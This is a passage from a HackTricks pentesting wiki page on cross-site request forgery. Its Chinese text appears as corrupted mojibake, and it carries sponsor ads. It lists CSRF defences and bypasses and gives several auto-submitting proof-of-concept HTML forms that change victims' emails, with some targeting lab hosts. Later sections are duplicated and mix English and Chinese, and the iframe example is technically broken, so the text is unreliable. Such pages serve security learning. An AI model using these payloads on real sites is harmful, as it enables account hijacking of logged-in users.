# CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofæ˜¯æ‰€æœ‰åŠ å¯†æ¼æ´èµé‡‘çš„å®¶å›­ã€‚**

**å³æ—¶è·å¾—å¥–åŠ±**\
HackenProofçš„èµé‡‘åªæœ‰åœ¨å®¢æˆ·å­˜å…¥å¥–åŠ±é¢„ç®—åæ‰ä¼šå¯åŠ¨ã€‚åœ¨æ¼æ´ç»è¿‡éªŒè¯åï¼Œæ‚¨å°†è·å¾—å¥–åŠ±ã€‚

**åœ¨web3æ¸—é€æµ‹è¯•ä¸­ç§¯ç´¯ç»éªŒ**\
åŒºå—é“¾åè®®å’Œæ™ºèƒ½åˆçº¦æ˜¯æ–°çš„äº’è”ç½‘ï¼åœ¨å…¶å…´èµ·çš„æ—¥å­é‡ŒæŒæ¡web3å®‰å…¨ã€‚

**æˆä¸ºweb3é»‘å®¢ä¼ å¥‡**\
æ¯æ¬¡éªŒè¯çš„æ¼æ´éƒ½ä¼šè·å¾—å£°èª‰ç§¯åˆ†ï¼Œå¹¶å æ®æ¯å‘¨æ’è¡Œæ¦œçš„æ¦œé¦–ã€‚

[**åœ¨HackenProofä¸Šæ³¨å†Œ**](https://hackenproof.com/register)å¼€å§‹ä»æ‚¨çš„é»‘å®¢è¡ŒåŠ¨ä¸­è·åˆ©ï¼

{% embed url="https://hackenproof.com/register" %}

## ä»€ä¹ˆæ˜¯CSRFï¼Ÿ

**è·¨ç«™è¯·æ±‚ä¼ªé€ **ï¼ˆä¹Ÿç§°ä¸ºCSRFï¼‰æ˜¯ä¸€ç§Webå®‰å…¨æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…**è¯±ä½¿ç”¨æˆ·æ‰§è¡Œä»–ä»¬ä¸æ‰“ç®—æ‰§è¡Œçš„æ“ä½œ**ã€‚\
è¿™æ˜¯é€šè¿‡ä½¿å—å®³è€…å¹³å°ä¸Šçš„**å·²ç™»å½•ç”¨æˆ·**è®¿é—®æ”»å‡»è€…æ§åˆ¶çš„ç½‘ç«™ï¼Œå¹¶ä»é‚£é‡Œ**æ‰§è¡Œ**æ¶æ„JSä»£ç ã€å‘é€è¡¨å•æˆ–æ£€ç´¢â€œå›¾åƒâ€åˆ°**å—å®³è€…è´¦æˆ·**æ¥å®ç°çš„ã€‚

### å…ˆå†³æ¡ä»¶

è¦æ»¥ç”¨CSRFæ¼æ´ï¼Œé¦–å…ˆéœ€è¦**æ‰¾åˆ°ä¸€ä¸ªç›¸å…³çš„æ“ä½œæ¥æ»¥ç”¨**ï¼ˆæ›´æ”¹å¯†ç æˆ–ç”µå­é‚®ä»¶ã€è®©å—å®³è€…åœ¨ç¤¾äº¤ç½‘ç»œä¸Šå…³æ³¨æ‚¨ã€ç»™æ‚¨æ›´å¤šæƒé™ç­‰ï¼‰ã€‚ä¼šè¯å¿…é¡»ä»…ä¾èµ–äºcookieæˆ–HTTPåŸºæœ¬èº«ä»½éªŒè¯æ ‡å¤´ï¼Œä¸èƒ½ä½¿ç”¨ä»»ä½•å…¶ä»–æ ‡å¤´æ¥å¤„ç†ä¼šè¯ã€‚æœ€åï¼Œè¯·æ±‚ä¸­**ä¸åº”è¯¥æœ‰ä¸å¯é¢„æµ‹çš„å‚æ•°**ã€‚

å¯ä»¥é‡‡å–å¤šç§**å¯¹ç­–**æ¥é¿å…æ­¤æ¼æ´ã€‚

### **å¸¸è§çš„é˜²å¾¡æªæ–½**

* [**SameSite cookies**](hacking-with-cookies/#samesite)ï¼šå¦‚æœä¼šè¯cookieä½¿ç”¨æ­¤æ ‡å¿—ï¼Œæ‚¨å¯èƒ½æ— æ³•ä»ä»»æ„ç½‘ç«™å‘é€cookieã€‚
* [**è·¨æºèµ„æºå…±äº«**](cors-bypass.md)ï¼šæ ¹æ®æ‚¨éœ€è¦æ‰§è¡Œçš„HTTPè¯·æ±‚ç±»å‹ï¼Œæ‚¨å¯èƒ½éœ€è¦è€ƒè™‘å—å®³ç«™ç‚¹çš„**CORSç­–ç•¥**ã€‚_è¯·æ³¨æ„ï¼ŒCORSç­–ç•¥ä¸ä¼šå½±å“æ‚¨åªæƒ³ä»è¡¨å•å‘é€GETè¯·æ±‚æˆ–POSTè¯·æ±‚è€Œä¸éœ€è¦è¯»å–å“åº”çš„æƒ…å†µã€‚_
* è¦æ±‚ç”¨æˆ·è¾“å…¥**å¯†ç **ä»¥æˆæƒæ“ä½œã€‚
* è§£æ**Referrer**æˆ–**Origin**æ ‡å¤´ã€‚å¦‚æœä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ç»•è¿‡ï¼š
* http://mal.net?orig=http://example.comï¼ˆä»¥è¯¥URLç»“å°¾ï¼‰
* http://example.com.mal.netï¼ˆä»¥è¯¥URLå¼€å¤´ï¼‰
* **ä¿®æ”¹**Postæˆ–Getè¯·æ±‚çš„**å‚æ•°åç§°**
* åœ¨æ¯ä¸ªä¼šè¯ä¸­ä½¿ç”¨**CSRFä»¤ç‰Œ**ã€‚æ­¤ä»¤ç‰Œå¿…é¡»åœ¨è¯·æ±‚ä¸­å‘é€ä»¥ç¡®è®¤æ“ä½œã€‚æ­¤ä»¤ç‰Œå¯ä»¥å—åˆ°CORSçš„ä¿æŠ¤ã€‚

### CSRFæ˜ å°„

![](<../.gitbook/assets/image (112).png>)

## é˜²å¾¡ç»•è¿‡

### ä»POSTåˆ°GET

ä¹Ÿè®¸æ‚¨æƒ³è¦æ»¥ç”¨çš„è¡¨å•å‡†å¤‡å‘é€**å¸¦æœ‰CSRFä»¤ç‰Œçš„POSTè¯·æ±‚**ï¼Œä½†æ˜¯ï¼Œæ‚¨åº”è¯¥**æ£€æŸ¥**æ˜¯å¦ä¹Ÿå¯ä»¥å‘é€**GETè¯·æ±‚**ï¼Œå¹¶ä¸”åœ¨å‘é€GETè¯·æ±‚æ—¶**ä»ç„¶éªŒè¯CSRFä»¤ç‰Œ**ã€‚

### ç¼ºå°‘ä»¤ç‰Œ

æŸäº›åº”ç”¨ç¨‹åºåœ¨ä»¤ç‰Œå­˜åœ¨æ—¶**æ­£ç¡®éªŒè¯ä»¤ç‰Œï¼Œä½†å¦‚æœçœç•¥äº†ä»¤ç‰Œï¼Œåˆ™è·³è¿‡éªŒè¯**ã€‚\
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥**åˆ é™¤åŒ…å«ä»¤ç‰Œçš„æ•´ä¸ªå‚æ•°**ï¼ˆè€Œä¸ä»…ä»…æ˜¯å…¶å€¼ï¼‰ï¼Œä»¥ç»•è¿‡éªŒè¯å¹¶è¿›è¡ŒCSRFæ”»å‡»ã€‚

### CSRFä»¤ç‰Œä¸ç”¨æˆ·ä¼šè¯æ— å…³

æŸäº›åº”ç”¨ç¨‹åº**ä¸éªŒè¯ä»¤ç‰Œæ˜¯å¦å±äºå‘å‡ºè¯·æ±‚çš„ç”¨æˆ·ä¼šè¯**ã€‚ç›¸åï¼Œåº”ç”¨ç¨‹åºç»´æŠ¤ä¸€ä¸ªå…¨å±€ä»¤ç‰Œæ± ï¼Œæ¥å—å‡ºç°åœ¨æ­¤æ± ä¸­çš„ä»»ä½•ä»¤ç‰Œã€‚\
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨è‡ªå·±çš„å¸æˆ·ç™»å½•åº”ç”¨ç¨‹åºï¼Œ**è·å–æœ‰æ•ˆä»¤ç‰Œ**ï¼Œç„¶åå°†è¯¥ä»¤ç‰Œæä¾›ç»™å—å®³è€…ç”¨æˆ·è¿›è¡ŒCSRFæ”»å‡»ã€‚

### æ–¹æ³•ç»•è¿‡

å¦‚æœè¯·æ±‚ä½¿ç”¨äº†â€œ**å¥‡æ€ªçš„**â€**æ–¹æ³•**ï¼Œè¯·æ£€æŸ¥**æ–¹æ³•è¦†ç›–åŠŸèƒ½**æ˜¯å¦æ­£å¸¸å·¥ä½œã€‚\
ä¾‹å¦‚ï¼Œå¦‚æœä½¿ç”¨äº†**PUTæ–¹æ³•**ï¼Œæ‚¨å¯ä»¥å°è¯•ä½¿ç”¨**POSTæ–¹æ³•**å¹¶å‘é€ï¼š_https://example.com/my/dear/api/val/num?**\_method=PUT**_

è¿™ä¹Ÿå¯ä»¥é€šè¿‡åœ¨POSTè¯·æ±‚ä¸­å‘é€**\_methodå‚æ•°**æˆ–ä½¿ç”¨**æ ‡å¤´**æ¥å®ç°ï¼š

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_
### è‡ªå®šä¹‰å¤´éƒ¨ä»¤ç‰Œç»•è¿‡

å¦‚æœè¯·æ±‚ä¸­æ·»åŠ äº†ä¸€ä¸ªå¸¦æœ‰ä»¤ç‰Œçš„è‡ªå®šä¹‰å¤´éƒ¨ä½œä¸ºCSRFä¿æŠ¤æ–¹æ³•ï¼Œé‚£ä¹ˆï¼š

- åœ¨è¯·æ±‚ä¸­æµ‹è¯•æ—¶ä¸å¸¦è‡ªå®šä¹‰ä»¤ç‰Œå’Œå¤´éƒ¨ã€‚
- åœ¨è¯·æ±‚ä¸­æµ‹è¯•æ—¶ä½¿ç”¨é•¿åº¦ç›¸åŒä½†ä»¤ç‰Œä¸åŒçš„å€¼ã€‚

### CSRFä»¤ç‰Œç”±CookieéªŒè¯

åœ¨å‰é¢çš„æ¼æ´çš„è¿›ä¸€æ­¥å˜ç§ä¸­ï¼Œä¸€äº›åº”ç”¨ç¨‹åºä¼šåœ¨Cookieå’Œè¯·æ±‚å‚æ•°ä¸­**å¤åˆ¶æ¯ä¸ªä»¤ç‰Œ**ã€‚æˆ–è€…åœ¨åç«¯**è®¾ç½®ä¸€ä¸ªCSRF Cookie**ï¼Œå¹¶ä¸”**æ£€æŸ¥åç«¯æ˜¯å¦ä¸Cookieç›¸å…³è”çš„CSRFä»¤ç‰Œ**ã€‚

å½“éªŒè¯åç»­è¯·æ±‚æ—¶ï¼Œåº”ç”¨ç¨‹åºåªéœ€éªŒè¯**è¯·æ±‚å‚æ•°ä¸­æäº¤çš„ä»¤ç‰Œæ˜¯å¦ä¸Cookieä¸­å­˜å‚¨çš„å€¼åŒ¹é…**ã€‚\
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœç½‘ç«™ä¸­å­˜åœ¨ä»»ä½•å…è®¸æ”»å‡»è€…å°†å…¶CSRF Cookieè®¾ç½®ä¸ºå—å®³è€…çš„æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥å†æ¬¡æ‰§è¡ŒCSRFæ”»å‡»ã€‚

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥å°è¯•è®¾ç½®Cookieæ¥åŠ è½½ä¸€ä¸ªä¼ªé€ çš„å›¾åƒï¼Œç„¶ååƒè¿™ä¸ªä¾‹å­ä¸€æ ·å‘èµ·CSRFæ”»å‡»ï¼š
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>
```
{% hint style="info" %}
è¯·æ³¨æ„ï¼Œå¦‚æœ**csrfä»¤ç‰Œä¸ä¼šè¯cookieç›¸å…³è”ï¼Œæ­¤æ”»å‡»å°†æ— æ•ˆ**ï¼Œå› ä¸ºæ‚¨éœ€è¦å°†æ‚¨çš„ä¼šè¯è®¾ç½®ä¸ºå—å®³è€…ï¼Œå› æ­¤æ‚¨å°†æ”»å‡»è‡ªå·±ã€‚
{% endhint %}

### æ›´æ”¹Content-Type

æ ¹æ®[**è¿™é‡Œ**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests)ï¼Œä¸ºäº†**é¿å…é¢„æ£€è¯·æ±‚**ä½¿ç”¨**POST**æ–¹æ³•ï¼Œè¿™äº›æ˜¯å…è®¸çš„Content-Typeå€¼ï¼š

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

ç„¶è€Œï¼Œè¯·æ³¨æ„ï¼Œ**æœåŠ¡å™¨é€»è¾‘å¯èƒ½ä¼šæœ‰æ‰€ä¸åŒ**ï¼Œå–å†³äºä½¿ç”¨çš„Content-Typeï¼Œå› æ­¤æ‚¨åº”è¯¥å°è¯•ä¸Šè¿°æåˆ°çš„å€¼ä»¥åŠå…¶ä»–å€¼ï¼Œå¦‚**`application/json`**_**,**_**`text/xml`**ï¼Œ**`application/xml`**_._

å‘é€JSONæ•°æ®ä½œä¸ºtext/plainçš„ç¤ºä¾‹ï¼ˆæ¥è‡ª[è¿™é‡Œ](https://brycec.me/posts/corctf\_2021\_challenges)ï¼‰ï¼š
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### application/jsoné¢„æ£€è¯·æ±‚ç»•è¿‡

æ­£å¦‚ä½ å·²ç»çŸ¥é“çš„ï¼Œä½ ä¸èƒ½é€šè¿‡HTMLè¡¨å•å‘é€Content-Typeä¸º**`application/json`**çš„POSTè¯·æ±‚ï¼Œå¦‚æœä½ å°è¯•é€šè¿‡**`XMLHttpRequest`**è¿™æ ·åšï¼Œé¦–å…ˆä¼šå‘é€ä¸€ä¸ª**é¢„æ£€è¯·æ±‚**ã€‚\
ç„¶è€Œï¼Œä½ å¯ä»¥å°è¯•ä½¿ç”¨å†…å®¹ç±»å‹ä¸º**`text/plain`**å’Œ**`application/x-www-form-urlencoded`**æ¥å‘é€JSONæ•°æ®ï¼Œåªæ˜¯ä¸ºäº†æ£€æŸ¥åç«¯æ˜¯å¦ç‹¬ç«‹äºContent-Typeä½¿ç”¨æ•°æ®ã€‚\
ä½ å¯ä»¥ä½¿ç”¨`Content-Type: text/plain`è®¾ç½®**`enctype="text/plain"`**æ¥å‘é€ä¸€ä¸ªè¡¨å•ã€‚

å¦‚æœæœåŠ¡å™¨åªæ¥å—å†…å®¹ç±»å‹ä¸º"application/json"ï¼Œä½ å¯ä»¥å‘é€å†…å®¹ç±»å‹ä¸º"text/plain; application/json"çš„è¯·æ±‚ï¼Œè€Œä¸è§¦å‘é¢„æ£€è¯·æ±‚ã€‚

ä½ è¿˜å¯ä»¥å°è¯•é€šè¿‡ä½¿ç”¨**SWF Flashæ–‡ä»¶**æ¥**ç»•è¿‡**è¿™ä¸ªé™åˆ¶ã€‚æ›´å¤šä¿¡æ¯è¯·[**é˜…è¯»æ­¤æ–‡ç« **](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937)ã€‚

### ç»•è¿‡Referrer / Originæ£€æŸ¥

**é¿å…ä½¿ç”¨Referrerå¤´**

ä¸€äº›åº”ç”¨ç¨‹åºåœ¨è¯·æ±‚ä¸­éªŒè¯Refererå¤´æ˜¯å¦å­˜åœ¨ï¼Œä½†æ˜¯**å¦‚æœçœç•¥äº†è¯¥å¤´ï¼Œåˆ™è·³è¿‡éªŒè¯**ã€‚
```markup
<meta name="referrer" content="never">
```
**æ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

è¦åœ¨Referrerå°†å‘é€åˆ°å‚æ•°å†…çš„URLä¸­è®¾ç½®æœåŠ¡å™¨çš„åŸŸåï¼Œå¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **HEADæ–¹æ³•ç»•è¿‡**

[**è¿™ä¸ªCTFè§£ç­”**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution)çš„ç¬¬ä¸€éƒ¨åˆ†è§£é‡Šäº†[Oakçš„æºä»£ç ](https://github.com/oakserver/oak/blob/main/router.ts#L281)ï¼Œä¸€ä¸ªè·¯ç”±å™¨è¢«è®¾ç½®ä¸ºå°†**HEADè¯·æ±‚å¤„ç†ä¸ºæ²¡æœ‰å“åº”ä½“çš„GETè¯·æ±‚** - è¿™æ˜¯ä¸€ä¸ªå¸¸è§çš„è§£å†³æ–¹æ³•ï¼Œä¸ä»…ä»…é€‚ç”¨äºOakã€‚ä¸å¤„ç†HEADè¯·æ±‚çš„ç‰¹å®šå¤„ç†ç¨‹åºä¸åŒï¼Œå®ƒä»¬åªæ˜¯**äº¤ç»™GETå¤„ç†ç¨‹åºï¼Œä½†åº”ç”¨ç¨‹åºä¼šåˆ é™¤å“åº”ä½“**ã€‚

å› æ­¤ï¼Œå¦‚æœGETè¯·æ±‚å—åˆ°é™åˆ¶ï¼Œæ‚¨å¯ä»¥**å‘é€ä¸€ä¸ªå°†è¢«å¤„ç†ä¸ºGETè¯·æ±‚çš„HEADè¯·æ±‚**ã€‚

## **åˆ©ç”¨ç¤ºä¾‹**

### **çªƒå–CSRFä»¤ç‰Œ**

å¦‚æœä½¿ç”¨**CSRFä»¤ç‰Œ**ä½œä¸º**é˜²å¾¡**ï¼Œæ‚¨å¯ä»¥å°è¯•é€šè¿‡æ»¥ç”¨[XSS](xss-cross-site-scripting/#xss-stealing-csrf-tokens)æ¼æ´æˆ–[æ‚¬æŒ‚æ ‡è®°](dangling-markup-html-scriptless-injection.md)æ¼æ´æ¥**çªƒå–å®ƒ**ã€‚

### **ä½¿ç”¨HTMLæ ‡ç­¾è¿›è¡ŒGETè¯·æ±‚**
```markup
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
å…¶ä»–å¯ä»¥ç”¨äºè‡ªåŠ¨å‘é€GETè¯·æ±‚çš„HTML5æ ‡ç­¾æœ‰ï¼š

![](<../.gitbook/assets/image (530).png>)

### è¡¨å•GETè¯·æ±‚
```markup
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### è¡¨å•POSTè¯·æ±‚

A common method for sending data to a server is through a form POST request. This is commonly used in web applications for submitting user input or performing actions on the server.

To send a form POST request, the client (usually a web browser) constructs an HTTP request with the following characteristics:

- The HTTP method is set to POST.
- The target URL is specified in the `action` attribute of the form element.
- The form data is encoded and included in the body of the request.

The server then processes the request and performs the necessary actions based on the submitted data.

### è¡¨å•POSTè¯·æ±‚

å‘æœåŠ¡å™¨å‘é€æ•°æ®çš„å¸¸è§æ–¹æ³•æ˜¯é€šè¿‡è¡¨å•POSTè¯·æ±‚ã€‚è¿™åœ¨Webåº”ç”¨ç¨‹åºä¸­å¸¸ç”¨äºæäº¤ç”¨æˆ·è¾“å…¥æˆ–åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œæ“ä½œã€‚

è¦å‘é€è¡¨å•POSTè¯·æ±‚ï¼Œå®¢æˆ·ç«¯ï¼ˆé€šå¸¸æ˜¯Webæµè§ˆå™¨ï¼‰æ„é€ ä¸€ä¸ªå…·æœ‰ä»¥ä¸‹ç‰¹å¾çš„HTTPè¯·æ±‚ï¼š

- HTTPæ–¹æ³•è®¾ç½®ä¸ºPOSTã€‚
- ç›®æ ‡URLåœ¨è¡¨å•å…ƒç´ çš„`action`å±æ€§ä¸­æŒ‡å®šã€‚
- è¡¨å•æ•°æ®è¢«ç¼–ç å¹¶åŒ…å«åœ¨è¯·æ±‚çš„æ­£æ–‡ä¸­ã€‚

ç„¶åï¼ŒæœåŠ¡å™¨å¤„ç†è¯·æ±‚å¹¶æ ¹æ®æäº¤çš„æ•°æ®æ‰§è¡Œå¿…è¦çš„æ“ä½œã€‚
```markup
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### é€šè¿‡iframeè¿›è¡Œè¡¨å•POSTè¯·æ±‚

An attacker can exploit Cross-Site Request Forgery (CSRF) vulnerabilities by tricking a victim into submitting a form without their knowledge or consent. One way to achieve this is by using an iframe.

æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰æ¼æ´ï¼Œé€šè¿‡æ¬ºéª—å—å®³è€…åœ¨ä¸çŸ¥æƒ…æˆ–æœªç»åŒæ„çš„æƒ…å†µä¸‹æäº¤è¡¨å•æ¥è¿›è¡Œæ”»å‡»ã€‚å…¶ä¸­ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨iframeã€‚

To perform a CSRF attack using an iframe, the attacker creates a webpage that contains a hidden form. This form is then submitted automatically by the victim's browser when they visit the attacker's webpage.

è¦ä½¿ç”¨iframeæ‰§è¡ŒCSRFæ”»å‡»ï¼Œæ”»å‡»è€…åˆ›å»ºä¸€ä¸ªåŒ…å«éšè—è¡¨å•çš„ç½‘é¡µã€‚å½“å—å®³è€…è®¿é—®æ”»å‡»è€…çš„ç½‘é¡µæ—¶ï¼Œè¯¥è¡¨å•å°†ç”±å—å®³è€…çš„æµè§ˆå™¨è‡ªåŠ¨æäº¤ã€‚

Here's an example of how the attack works:

ä»¥ä¸‹æ˜¯æ”»å‡»çš„ç¤ºä¾‹ï¼š

```html
<html>
  <body>
    <h1>Welcome to my website!</h1>
    <iframe src="https://victim-website.com" style="display:none;"></iframe>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

In this example, the attacker's webpage includes an iframe that loads the victim's website. The iframe is hidden from the user's view using the `display:none;` CSS property. The JavaScript code then automatically submits the first form on the victim's website.

åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œæ”»å‡»è€…çš„ç½‘é¡µåŒ…å«ä¸€ä¸ªåŠ è½½å—å®³è€…ç½‘ç«™çš„iframeã€‚ä½¿ç”¨`display:none;` CSSå±æ€§ï¼Œå°†iframeéšè—åœ¨ç”¨æˆ·çš„è§†å›¾ä¹‹å¤–ã€‚ç„¶åï¼ŒJavaScriptä»£ç è‡ªåŠ¨æäº¤å—å®³è€…ç½‘ç«™ä¸Šçš„ç¬¬ä¸€ä¸ªè¡¨å•ã€‚

When the victim visits the attacker's webpage, their browser will automatically submit the form on the victim's website, potentially causing unintended actions or changes in the victim's account.

å½“å—å®³è€…è®¿é—®æ”»å‡»è€…çš„ç½‘é¡µæ—¶ï¼Œä»–ä»¬çš„æµè§ˆå™¨å°†è‡ªåŠ¨æäº¤å—å®³è€…ç½‘ç«™ä¸Šçš„è¡¨å•ï¼Œå¯èƒ½å¯¼è‡´å—å®³è€…è´¦æˆ·ä¸­çš„æ„å¤–æ“ä½œæˆ–æ›´æ”¹ã€‚

To protect against CSRF attacks, web developers should implement measures such as using anti-CSRF tokens, checking the origin of requests, and implementing strict referer policies.

ä¸ºäº†é˜²æ­¢CSRFæ”»å‡»ï¼ŒWebå¼€å‘äººå‘˜åº”é‡‡å–æªæ–½ï¼Œå¦‚ä½¿ç”¨åCSRFä»¤ç‰Œã€æ£€æŸ¥è¯·æ±‚çš„æ¥æºå’Œå®æ–½ä¸¥æ ¼çš„å¼•ç”¨ç­–ç•¥ã€‚
```markup
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Ajax POST è¯·æ±‚**

In an Ajax POST request, the browser sends a request to the server to perform an action, such as updating data or submitting a form, without reloading the entire page. This is done using JavaScript and the XMLHttpRequest object.

åœ¨ Ajax POST è¯·æ±‚ä¸­ï¼Œæµè§ˆå™¨å‘é€ä¸€ä¸ªè¯·æ±‚åˆ°æœåŠ¡å™¨æ‰§è¡Œä¸€ä¸ªåŠ¨ä½œï¼Œæ¯”å¦‚æ›´æ–°æ•°æ®æˆ–æäº¤ä¸€ä¸ªè¡¨å•ï¼Œè€Œä¸éœ€è¦é‡æ–°åŠ è½½æ•´ä¸ªé¡µé¢ã€‚è¿™æ˜¯é€šè¿‡ä½¿ç”¨ JavaScript å’Œ XMLHttpRequest å¯¹è±¡æ¥å®ç°çš„ã€‚

To perform a CSRF attack on an Ajax POST request, the attacker needs to trick the victim into making a request to a specific URL with malicious parameters. This can be done by embedding the malicious request in a webpage or by exploiting a vulnerability in a trusted website.

è¦å¯¹ Ajax POST è¯·æ±‚è¿›è¡Œ CSRF æ”»å‡»ï¼Œæ”»å‡»è€…éœ€è¦è¯±ä½¿å—å®³è€…å‘ç‰¹å®šçš„ URL å‘é€å¸¦æœ‰æ¶æ„å‚æ•°çš„è¯·æ±‚ã€‚è¿™å¯ä»¥é€šè¿‡å°†æ¶æ„è¯·æ±‚åµŒå…¥åˆ°ç½‘é¡µä¸­æˆ–åˆ©ç”¨å—ä¿¡ä»»ç½‘ç«™çš„æ¼æ´æ¥å®ç°ã€‚

To protect against CSRF attacks in Ajax POST requests, you can implement the same techniques as in regular form submissions, such as using CSRF tokens or checking the origin of the request.

ä¸ºäº†é˜²æ­¢ Ajax POST è¯·æ±‚çš„ CSRF æ”»å‡»ï¼Œå¯ä»¥é‡‡ç”¨ä¸å¸¸è§„è¡¨å•æäº¤ç›¸åŒçš„æŠ€æœ¯ï¼Œæ¯”å¦‚ä½¿ç”¨ CSRF ä»¤ç‰Œæˆ–æ£€æŸ¥è¯·æ±‚çš„æ¥æºã€‚

It is important to note that Ajax requests can still be vulnerable to CSRF attacks even if they are made with the POST method, as the attacker can still trick the victim into making the request.

